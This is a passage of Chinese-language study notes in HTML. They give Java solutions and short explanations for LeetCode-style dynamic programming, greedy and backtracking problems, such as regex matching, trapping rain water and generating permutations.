= 100       8 = 1000<br>          3 = 11       6 = 110       12 = 1100<br>另外，0 的 1 个数为 0，于是就可以根据奇偶性开始遍历计算了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] countBits(<span class="keyword">int</span> num) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[num + <span class="number">1</span>];</span><br><span class="line">    res[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">            res[i] = res[i - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res[i] = res[i / <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-19-正则表达式匹配"><a href="#6-19-正则表达式匹配" class="headerlink" title="6.19 正则表达式匹配"></a>6.19 正则表达式匹配</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isMatch</span><span class="params">(String s, String p)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//s待匹配，p是正则</span></span><br><span class="line">    <span class="keyword">int</span> n = s.length();</span><br><span class="line">    <span class="keyword">int</span> m = p.length();</span><br><span class="line">    <span class="keyword">boolean</span>[][] dp= <span class="keyword">new</span> <span class="keyword">boolean</span>[n+<span class="number">1</span>][m+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j&lt;= m; j++)&#123;</span><br><span class="line">            <span class="comment">//空正则</span></span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">0</span>)&#123;</span><br><span class="line">                dp[i][j] = i == <span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//非空正则 两种情况*和非*</span></span><br><span class="line">                <span class="keyword">if</span> (p.charAt(j-<span class="number">1</span>) != <span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; (s.charAt(i-<span class="number">1</span>) == p.charAt(j-<span class="number">1</span>) || p.charAt(j-<span class="number">1</span>) == <span class="string">&#x27;.&#x27;</span>))&#123;</span><br><span class="line">                        dp[i][j] = dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//遇到*，分为看和不看</span></span><br><span class="line">                    <span class="comment">//看</span></span><br><span class="line">                    <span class="keyword">if</span> (i &gt;=<span class="number">1</span> &amp;&amp; j&gt;=<span class="number">2</span> &amp;&amp;(s.charAt(i-<span class="number">1</span>) == p.charAt(j-<span class="number">2</span>) || p.charAt(j-<span class="number">2</span>) == <span class="string">&#x27;.&#x27;</span>))&#123;</span><br><span class="line">                        dp[i][j] |= dp[i-<span class="number">1</span>][j];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//不看</span></span><br><span class="line">                    <span class="keyword">if</span> (j&gt;=<span class="number">2</span>)&#123;</span><br><span class="line">                        dp[i][j] |= dp[i][j-<span class="number">2</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[n][m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-20-最长有效括号"><a href="#6-20-最长有效括号" class="headerlink" title="6.20 最长有效括号"></a>6.20 最长有效括号</h2><p>​        我们定义$ \textit{dp}[i]$ 表示以下标 i 字符结尾的最长有效括号的长度。我们将 $\textit{dp}$ 数组全部初始化为 0 。显然有效的子串一定以 $\text{‘)’}$ 结尾，因此我们可以知道以 $\text{‘(’}$结尾的子串对应的 $\textit{dp}$ 值必定为 0 ，我们只需要求解 $\text{‘)’}$ 在 $\textit{dp}$ 数组中对应位置的值。</p><p>我们从前往后遍历字符串求解 $\textit{dp}$ 值，我们每两个字符检查一次：</p><p>$s[i] = \text{‘)’}$ 且 $s[i - 1] = \text{‘(’}$，也就是字符串形如 “……()”，我们可以推出：</p><p>$\textit{dp}[i]=\textit{dp}[i-2]+2$</p><p>我们可以进行这样的转移，是因为结束部分的 “()” 是一个有效子字符串，并且将之前有效子字符串的长度增加了2 。</p><p>$s[i] = \text{‘)’}$且$ s[i - 1] = \text{‘)’}$，也就是字符串形如 “……))”，我们可以推出：<br>如果$ s[i - \textit{dp}[i - 1] - 1] = \text{‘(’}$，那么</p><script type="math/tex; mode=display">\textit{dp}[i]=\textit{dp}[i-1]+\textit{dp}[i-\textit{dp}[i-1]-2]+2</script><p>我们考虑如果倒数第二个 $\text{‘)’}$是一个有效子字符串的一部分（记作$sub_s$），对于最后一个 $\text{‘)’}$ ，如果它是一个更长子字符串的一部分，那么它一定有一个对应的 $\text{‘(’}$，且它的位置在倒数第二个 $\text{‘)’}$ 所在的有效子字符串的前面（也就是 $sub_s$的前面）。因此，如果子字符串 $sub_s$的前面恰好是 $\text{‘(’}$ ，那么我们就用 2 加上$ sub_s$的长度$（\textit{dp}[i-1]）$去更新 $\textit{dp}[i]$。同时，我们也会把有效子串 $“(sub_s)”$之前的有效子串的长度也加上，也就是再加上 $\textit{dp}[i-\textit{dp}[i-1]-2]$。</p><p>最后的答案即为 $\textit{dp}$ 数组中的最大值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestValidParentheses</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[s.length()];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; s.length(); i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.charAt(i) == <span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                dp[i] = (i &gt;= <span class="number">2</span> ? dp[i - <span class="number">2</span>] : <span class="number">0</span>) + <span class="number">2</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i - dp[i - <span class="number">1</span>] &gt; <span class="number">0</span> &amp;&amp; s.charAt(i - dp[i - <span class="number">1</span>] - <span class="number">1</span>) == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                dp[i] = dp[i - <span class="number">1</span>] + ((i - dp[i - <span class="number">1</span>]) &gt;= <span class="number">2</span> ? dp[i - dp[i - <span class="number">1</span>] - <span class="number">2</span>] : <span class="number">0</span>) + <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res = Math.max(res, dp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-21-接雨水"><a href="#6-21-接雨水" class="headerlink" title="6.21 接雨水"></a>6.21 接雨水</h2><p>当前位置接水=min(right_max,left_max) - height[i]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">trap</span><span class="params">(<span class="keyword">int</span>[] height)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(height == <span class="keyword">null</span> || height.length == <span class="number">0</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">int</span> n = height.length;</span><br><span class="line">     <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">int</span>[] left_max = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">     <span class="keyword">int</span>[] right_max = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">     left_max[<span class="number">0</span>] = height[<span class="number">0</span>];</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">         left_max[i] = Math.max(left_max[i - <span class="number">1</span>], height[i]);</span><br><span class="line">     &#125;</span><br><span class="line">     right_max[n - <span class="number">1</span>] = height[n - <span class="number">1</span>];</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> j = n - <span class="number">2</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line">         right_max[j] = Math.max(right_max[j + <span class="number">1</span>], height[j]);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">//第一个和最后一个不能装水</span></span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">1</span>; k &lt; n - <span class="number">1</span>; k++)&#123;</span><br><span class="line">         res += Math.min(left_max[k], right_max[k]) - height[k];</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> res;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="6-22-戳气球"><a href="#6-22-戳气球" class="headerlink" title="6.22 戳气球"></a>6.22 戳气球</h2><p>添加虚拟气球和寻找状态选择是重点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxCoins</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    <span class="comment">//在nums两侧添加虚拟气球构成新数组</span></span><br><span class="line">    <span class="keyword">int</span>[] points = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">2</span>];</span><br><span class="line">    points[<span class="number">0</span>] = points[n + <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;    </span><br><span class="line">        points[i] = nums[i - <span class="number">1</span>];</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//dp[i][j]代表(i,j)获得硬币最大数量</span></span><br><span class="line">    <span class="comment">//base case 初始化0</span></span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">2</span>][n + <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = n; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n + <span class="number">2</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = i + <span class="number">1</span>; k &lt; j; k++)&#123;</span><br><span class="line">                dp[i][j] = Math.max(</span><br><span class="line">                    dp[i][j],</span><br><span class="line">                    dp[i][k] + dp[k][j] + points[i]*points[j]*points[k]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[<span class="number">0</span>][n + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-23-跳跃游戏"><a href="#6-23-跳跃游戏" class="headerlink" title="6.23 跳跃游戏"></a>6.23 跳跃游戏</h2><p> 贪心问题</p><p>遍历每个位置，若当前位置可到达，则根据当前位置i和nums[i]更新覆盖范围</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canJump</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mostLength = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i &lt;= mostLength)&#123;</span><br><span class="line">            mostLength = Math.max(mostLength, nums[i] + i);</span><br><span class="line">            <span class="keyword">if</span>(mostLength &gt;= n - <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="7-回溯"><a href="#7-回溯" class="headerlink" title="7. 回溯"></a>7. 回溯</h1><h2 id="7-1-全排列"><a href="#7-1-全排列" class="headerlink" title="7.1 全排列"></a>7.1 全排列</h2><p>选择LinkedList是因为要在链表尾频繁操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; permute(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">     LinkedList&lt;Integer&gt; track = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">     backtrack(nums, track);</span><br><span class="line">     <span class="keyword">return</span> res;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(<span class="keyword">int</span>[] nums, LinkedList&lt;Integer&gt; track)</span></span>&#123;</span><br><span class="line">     <span class="comment">//结束条件</span></span><br><span class="line">     <span class="keyword">if</span>(track.size() == nums.length)&#123;</span><br><span class="line">         res.add(<span class="keyword">new</span> LinkedList(track));</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">         <span class="comment">//不满足条件</span></span><br><span class="line">         <span class="keyword">if</span>(track.contains(nums[i]))&#123;</span><br><span class="line">             <span class="keyword">continue</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">//做选择</span></span><br><span class="line">         track.add(nums[i]);</span><br><span class="line">         backtrack(nums,track);</span><br><span class="line">         track.removeLast();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="7-2-子集"><a href="#7-2-子集" class="headerlink" title="7.2 子集"></a>7.2 子集</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; subsets(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">    <span class="comment">// 记录走过的路径</span></span><br><span class="line">    LinkedList&lt;Integer&gt; track = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    backtrack(nums, <span class="number">0</span>, track);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, LinkedList&lt;Integer&gt; track)</span> </span>&#123;</span><br><span class="line">    res.add(<span class="keyword">new</span> LinkedList(track));</span><br><span class="line">    <span class="comment">// 注意 i 从 start 开始递增</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; nums.length(); i++) &#123;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.add(nums[i]);</span><br><span class="line">        <span class="comment">// 回溯</span></span><br><span class="line">        backtrack(nums, i + <span class="number">1</span>, track);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-3-括号生成"><a href="#7-3-括号生成" class="headerlink" title="7.3 括号生成"></a>7.3 括号生成</h2><p>两个规则：</p><ul><li>一个「合法」括号组合的左括号数量一定等于右括号数量，这个很好理解。</li><li>对于一个「合法」的括号字符串组合 <code>p</code>，必然对于任何 <code>0 &lt;= i &lt; len(p)</code> 都有：子串 <code>p[0..i]</code> 中左括号的数量都大于或等于右括号的数量。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">generateParenthesis</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//结果数组</span></span><br><span class="line">    LinkedList&lt;String&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="comment">//回溯路径</span></span><br><span class="line">    StringBuilder track = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="comment">// 可用的左括号和右括号数量初始化为 n</span></span><br><span class="line">    backtrack(n, n, track, res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right, StringBuilder track, LinkedList&lt;String&gt; res)</span></span>&#123;</span><br><span class="line">    <span class="comment">//剩下可用左括号多，不合法</span></span><br><span class="line">    <span class="keyword">if</span>(left &gt; right)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//剩余可用&lt;0,不合法</span></span><br><span class="line">    <span class="keyword">if</span>(left &lt; <span class="number">0</span> || right &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//剩余括号正好为0合法</span></span><br><span class="line">    <span class="keyword">if</span>(left == <span class="number">0</span> &amp;&amp; right == <span class="number">0</span>)&#123;</span><br><span class="line">        String s = track.toString();</span><br><span class="line">        res.add(s);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//放左括号</span></span><br><span class="line">    track.append(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">    backtrack(left - <span class="number">1</span>, right, track, res);</span><br><span class="line">    track.deleteCharAt(track.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//放右括号</span></span><br><span class="line">    track.append(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">    backtrack(left, right - <span class="number">1</span>, track, res);</span><br><span class="line">    track.deleteCharAt(track.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-4-电话号码的字母组合"><a href="#7-4-电话号码的字母组合" class="headerlink" title="7.4 电话号码的字母组合"></a>7.4 电话号码的字母组合</h2><p>借鉴子集思路</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">letterCombinations</span><span class="params">(String digits)</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; res = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    <span class="keyword">if</span> (digits.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    Map&lt;Character, String&gt; phoneMap = <span class="keyword">new</span> HashMap&lt;Character, String&gt;() &#123;&#123;</span><br><span class="line">        put(<span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        put(<span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;def&quot;</span>);</span><br><span class="line">        put(<span class="string">&#x27;4&#x27;</span>, <span class="string">&quot;ghi&quot;</span>);</span><br><span class="line">        put(<span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;jkl&quot;</span>);</span><br><span class="line">        put(<span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;mno&quot;</span>);</span><br><span class="line">        put(<span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;pqrs&quot;</span>);</span><br><span class="line">        put(<span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;tuv&quot;</span>);</span><br><span class="line">        put(<span class="string">&#x27;9&#x27;</span>, <span class="string">&quot;wxyz&quot;</span>);</span><br><span class="line">    &#125;&#125;;</span><br><span class="line">    StringBuilder track = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    backtrack(res, track, digits, <span class="number">0</span>, phoneMap);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(List&lt;String&gt; res, StringBuilder track, String digits, <span class="keyword">int</span> index, Map&lt;Character, String&gt; phoneMap)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(index == digits.length())&#123;</span><br><span class="line">        String s = track.toString();</span><br><span class="line">        res.add(s);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String s = phoneMap.get(digits.charAt(index));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++)&#123;</span><br><span class="line">        track.append(s.charAt(i));</span><br><span class="line">        backtrack(res, track, digits, index + <span class="number">1</span>, phoneMap);</span><br><span class="line">        track.deleteCharAt(track.length() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-5-组合总和"><a href="#7-5-组合总和" class="headerlink" title="7.5 组合总和"></a>7.5 组合总和</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; combinationSum(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    List&lt;Integer&gt; track = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    backtrack(candidates, target, track, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> target, List&lt;Integer&gt; track, <span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(index == candidates.length)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(target == <span class="number">0</span>)&#123;</span><br><span class="line">        res.add(<span class="keyword">new</span> LinkedList&lt;Integer&gt;(track));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//不选当前数</span></span><br><span class="line">    backtrack(candidates, target, track, index + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//选择当前数，需要判断+回溯</span></span><br><span class="line">    <span 